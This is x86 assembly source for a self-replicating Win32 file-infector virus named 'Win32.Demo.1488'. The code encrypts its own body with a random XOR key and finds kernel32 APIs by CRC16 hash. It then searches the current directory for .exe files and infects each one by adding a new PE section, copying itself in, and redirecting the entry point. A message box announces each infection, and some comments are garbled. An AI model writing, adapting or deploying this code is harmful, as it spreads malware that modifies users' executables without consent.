   ; Win32.Demo.1488 [Demo V-2W]

   .386
   crc_poly = 0A001h
   crc_init = 0FFFFh

   crc16 macro string
         crc = crc_init
         irpc _x, <string>
         x = '&_x&' xor (crc and 0ffh)
         crc = crc shr 8
             rept 8
                  x = (x shr 1) xor (crc_poly * (x and 1))
             endm
         crc = crc xor x
         endm
         dw crc
         endm

   apicall macro api
         call dword ptr [ebp+&api&]
         endm

   locals __
   do equ 4 ptr
   wo equ 2 ptr
   bo equ 1 ptr
   model flat
   .data
   db ?
   .code

   start proc
       pushad
       call get_delta
       cld
       lea  edi, [ebp+__1]
       mov  ecx, (offset buffer-__1)/4+1
   __cr:
       xor  4 ptr [edi], 1234567h
       org  $-4
   key dd   0
       scasd
       loop __cr
       call __1
       mov  esp, [esp+4]
       jmp  exit
   get_delta:
       call $+5
   delta:
       pop  ebp
       sub  ebp, offset delta
       ret
   fi:
   __1:
       sub  eax, eax
       push do fs:[eax]
       mov  do fs:[eax], esp
       call get_kernel32
       call get_GetProcAddress
       jc   exit
       ; ebx - C00l
       push eax ebx
       lea  edx, [ebp+virt]
       push edx
       push eax
       call ebx
       ; eax - VirtualAlloc
       push 00000040h
       push 00002000h+00001000h+00100000h
       push vl
       push 0
       call eax
       pop  edx ebx
       cmp  eax, - 1
       jz   exit
       xchg edi, eax
       lea  eax, [ebp+exit]
       push eax
       lea  eax, [edi+next_load-start]
       push eax
       lea  esi, [ebp+start]
       mov  ecx, _vl
       cld
       rep movsb
       ret
       endp

   next_load:
       call get_delta
       mov  do [ebp+K32],           ebx
       mov  do [ebp+GetProcAdress], edx
       call infect
   _exit:
       lea  eax, [ebp+virtf]
       push eax
       push do [ebp+K32]
       apicall GetProcAdress
       push 00004000h+00008000h
       push 0
       lea  edx, [ebp+start]
       push edx
       call eax
       ret
   exit:
       pop  eax
       pop  4 ptr fs:[0]
       popad
       db   0B8h
   ret_adr  dd offset host
       jmp  eax

   virt  db 'VirtualAlloc',0
   virtf db 'VirtualFree',0

   get_kernel32:
        mov eax, [esp+4*4+4*7]
        and eax, 0FFFF0000H
               ; 0BFF70000H
   __2:
        cmp wo [eax], 'ZM'
        jz  __1
        sub eax, 10000h
        jmp __2
   __1:
        ret

   get_crc proc
        ; esi - string
        sub eax, eax
        dec eax
   __4:
        mov bl, [esi]
        inc esi
        test bl, bl
        jz  __1
        xor al, bl
        mov bl, 8
   __3:
        shr ax, 1
        jnc __2
        xor ax, crc_poly
   __2:
        dec bl
        jnz __3
        jmp __4
   __1:
        ret
        endp

   get_GetProcAddress:
        mov ebx, [eax+3Ch]
        add ebx, eax
        cmp wo [ebx], 'EP'
        jnz __1
        mov esi, do [78h+ebx]
        add esi, eax
        mov edi, do [esi+0Ch]
        mov ecx, do [esi+18h]
        cmp do [edi+eax], 4E52454Bh
        jnz __1
        mov edi, do [esi+20h]
        add edi, eax
   __2:
        mov ebx, [edi]
        cmp bo [ebx+eax], 'G'
        jnz __5
        push esi eax
        lea esi, [ebx+eax]
        call get_crc
        cmp ax, 1234h
        org $-2
        crc16 GetProcAddress
        pop eax esi
        jz __4
   __5:
        add edi, 4
        loop __2
        jmp __1
   __4: mov ebx, do [esi+18h]
        sub ebx, ecx
        ; ebx á ¨¬¥ ¬¨
        ; [esi+14]  á ®¬¥à ¬¨
        mov ecx, do [esi+14h]
        sub ecx, do [esi+18h]
        add ebx, ecx
        shl ebx, 2
        ; ebx - number of GetProcAddress
        mov edi, do [esi+1Ch]
        lea edi, [edi+ebx]
        mov ebx, [edi+eax]
        add ebx, eax
        ; ebx - address GetProcAddress
        ret
   __1:
        stc
        ret

   go_api macro api_name
        local x
        call x
        db '&api_name&',0
   x:
        push do [ebp+K32]
        apicall GetProcAdress
        call eax
        endm

   infect proc
        lea eax, [ebp+FIND_DATA]
        push eax
        call __2
        db '*.exe',0
   __2:
        go_api FindFirstFileA
        cmp eax, 0
        jz __3
        mov do [ebp+findhandle], eax
   __1:
        lea edx, [ebp+WFD_szFileName]
        call infect_file
        lea eax, [ebp+FIND_DATA]
        push eax
        push do [ebp+findhandle]
        go_api FindNextFileA
        cmp eax, 0
        jnz __1
        push do [ebp+findhandle]
        go_api FindClose
   __3:
        ret
        endp

   infect_file proc
        push 0 80h 3 0 0 0c0000000h edx
        call msg
        go_api CreateFileA
        cmp eax, -1
        jz __1
        mov do [ebp+handle], eax
        push eax
        ; 0 Number Size buffer handle
        push 0
        lea edx, [esp+4*1]
        push edx
        push 3Ch+4
        lea edx, [ebp+mz]
        push edx
        push eax
        go_api ReadFile
        pop ecx
        cmp ecx, 3Ch+4
        jnz close
        cmp 2 ptr [ebp+mz] , 'ZM'
        jnz close
        cmp 2 ptr [ebp+mz+18h], 40h
        jb  close
        movzx eax, wo [ebp+mz+3Ch]
        mov do [ebp+pe_begin], eax
        push 0
        push 0
        push eax
        push do [ebp+handle]
        go_api SetFilePointer
        ; ç¨â ¥¬ object
        push eax
        ; 0 Number Size buffer handle
        push 0
        lea edx, [esp+4*1]
        push edx
        push 400h
        lea edx, [ebp+object]
        push edx
        push do [ebp+handle]
        go_api ReadFile
        pop ecx
        cmp ecx, 400h
        jnz close
        lea esi, [ebp+object]
        cmp 2 ptr [esi], 'EP'
        jnz close
        mov eax, [esi+34h]
        add eax, [esi+28h]
        mov do [ebp+ret_adr], eax
        movzx eax, wo [esi+6]
        inc eax
        imul eax, eax, 28h
        movzx edx, wo [esi+14h]
        add edx, 18h
        add eax, edx
        cmp eax, 400h   ; ¢«¥§¥¬ ?
        ja  close
        movzx eax, wo [esi+6]
        inc  wo [esi+6]
        imul eax, eax, 28h
        movzx edx, wo [esi+14h]
        add edx, 18h
        add eax, edx
        add esi, eax
        mov edi, esi
        mov ecx, 28h
        xor al, al
        cld
        repe scasb
        jnz close
        mov do [esi], '1234'           ; ¨¬ï á¥ªæ¨¨ .fuck
        org $-4
        db  '.fuc'
        mov wo [esi+4], 'k'
        mov do [esi+28h-4], 00000020h or 40000000h or 80000000h ;  âà¨¡ãâ
        ; rnd
        go_api GetTickCount
        mov do [ebp+key], eax
        ;  ¤®  ©â¨ ¯®á«¥¤¥î á¥ªæ¨î
        mov eax, esi
        sub eax, 28h
        mov edx, do [eax+0Ch]
        add edx, do [eax+10h]
        xchg eax, edx
        sub edx, edx
        mov ecx, do [ebp+object+38h]     ; Object Align
        div ecx
        sub edx, edx
        inc eax
        mul ecx
        mov do [esi+0Ch], eax            ; Section RVA
        mov eax, _vl
        cdq
        mov ecx, do [ebp+object+3Ch]     ; File Align
        div ecx
        inc eax
        cdq
        mul ecx
        mov do [esi+010h], eax           ; Physical Size
        mov do [esi+008h], eax           ; Virtual Size
        mov eax, [ebp+WFD_nFileSizeLow]
        xor edx, edx
        mov ecx, do [ebp+object+3Ch]    ; File Align
        div ecx
        test edx, edx
        jnz close
        mul ecx
        mov do [esi+014h], eax          ; Physical Offset
        mov eax, do [esi+0Ch]
        mov do [ebp+object+28h], eax    ; Start IP
        push 0 0
        push do [ebp+WFD_nFileSizeLow]
        push do [ebp+handle]
        go_api SetFilePointer
        lea esi, [ebp+start]
        lea edi, [ebp+buffer_crypt]
        mov ecx, _vl
        cld
        rep movsb
        lea edi, [ebp+buffer_crypt+(fi-start)]
        mov ecx, (offset buffer-fi)/4+1
        mov edx, do [ebp+key]
   __cr:
        xor  4 ptr [edi], edx
        scasd
        loop __cr
        push eax
        push 0
        lea edx, [esp+4*1]
        push edx
        push _vl
        lea edx, [ebp+buffer_crypt]
        push edx
        push do [ebp+handle]
        go_api WriteFile
        pop ecx
        cmp ecx, _vl
        jnz close
        push 0 0
        push do [ebp+pe_begin]
        push do [ebp+handle]
        go_api SetFilePointer
        push eax
        push 0
        lea edx, [esp+4*1]
        push edx
        push 400h
        lea edx, [ebp+object]
        push edx
        push do [ebp+handle]
        go_api WriteFile
        pop ecx
   close:
        push do [ebp+handle]
        go_api CloseHandle
   __1:
        ret
        endp

   msg proc
        push 0
        call __2
        db 'I''am wanna infect filezz',0
   __2:
        push edx
        push 0
        call __1
        db 'USER32.DLL',0
   __1:
        go_api LoadLibraryA
        call __3
        db 'MessageBoxA',0
   __3:
        push eax
        apicall GetProcAdress
        call eax
        ret
        endp

   buffer:

   _vl = ($-start)

   pe_begin dd 0

   object db 400h-(3Ch+4) dup (00h)

   mz db 3Ch+4 dup (00h)

   GetProcAdress dd 0
   K32           dd 0
   findhandle    dd 0
   handle        dd 0

   MAX_PATH = 260

   FIND_DATA               label   byte
   WFD_dwFileAttributes    dd      0
   WFD_ftCreationTime      dq      0
   WFD_ftLastAccessTime    dq      0
   WFD_ftLastWriteTime     dq      0
   WFD_nFileSizeHigh       dd      0
   WFD_nFileSizeLow        dd      0
   WFD_dwReserved0         dd      0
   WFD_dwReserved1         dd      0
   WFD_szFileName          db      MAX_PATH dup (0)
   WFD_szAlternateFileName db      13 dup (0)
                           db      03 dup (0)

   buffer_crypt db _vl dup (0h)

   vl = ($-start)

   host:
         push 0
         call ExitProcess

   db 'Win32.Demo.'
   db _vl / 1000 mod 10 + '0'
   db _vl / 100  mod 10 + '0'
   db _vl / 10   mod 10 + '0'
   db _vl / 1    mod 10 + '0'


   extrn ExitProcess: proc
   end start
